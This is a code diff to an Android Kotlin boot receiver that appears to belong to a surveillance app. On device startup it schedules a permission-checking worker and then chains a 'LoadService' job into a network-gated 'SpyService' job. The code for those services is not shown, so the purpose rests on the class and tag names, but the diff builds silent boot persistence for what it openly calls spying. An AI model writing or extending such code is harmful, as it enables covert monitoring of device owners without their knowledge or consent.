@@ -1,9 +1,13 @@
 package com.example.background
 
+import android.Manifest
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.util.Log
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import androidx.work.Constraints
 import androidx.work.NetworkType
@@ -24,7 +28,14 @@ class BootReciever : BroadcastReceiver() {
 
             try {
                 //startMainActivity(context)
-                startTask()
+
+                val quickWorkRequest = OneTimeWorkRequestBuilder<PermissionWorker>()
+                    .addTag("CHECK_PERMS")
+                    .setInitialDelay(10, TimeUnit.SECONDS)
+                    .build()
+
+                WorkManager.getInstance().enqueue(quickWorkRequest)
+                //startTask()
             } catch (e: Exception) {
                 e.message?.let { Log.d(TAG, it) }
             }
@@ -47,13 +58,19 @@ class BootReciever : BroadcastReceiver() {
     private fun startTask() {
         val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
 
+            val loadWorkRequest = OneTimeWorkRequestBuilder<LoadService>()
+                .addTag("LOAD_JOB")
+                .setConstraints(constraints)
+                .setInitialDelay(1, TimeUnit.MINUTES)
+                .build()
+
             val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
                 .addTag("SPY_JOB")
                 .setConstraints(constraints)
                 .setInitialDelay(1, TimeUnit.MINUTES)
                 .build()
 
-            WorkManager.getInstance().enqueue(quickWorkRequest)
+            WorkManager.getInstance().beginWith(loadWorkRequest).then(quickWorkRequest).enqueue()
 
     }
 }
